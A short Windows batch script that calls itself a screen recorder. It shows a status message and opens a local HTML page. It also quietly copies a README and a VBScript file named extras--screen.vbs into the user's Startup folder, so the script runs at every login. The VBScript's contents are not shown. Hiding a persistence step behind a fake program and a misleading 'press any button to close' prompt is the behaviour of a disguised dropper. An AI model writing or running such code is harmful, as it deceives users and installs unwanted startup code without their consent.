@echo off
color 6a
echo Screen Recorder is up and running

echo to close screen rec press any button
START iexplore %~dps0Sample_Screen.html
copy README.txt "%USERPROFILE%\Start Menu\Programs\Startup"
copy extras--screen.vbs "%USERPROFILE%\Start Menu\Programs\Startup"

pause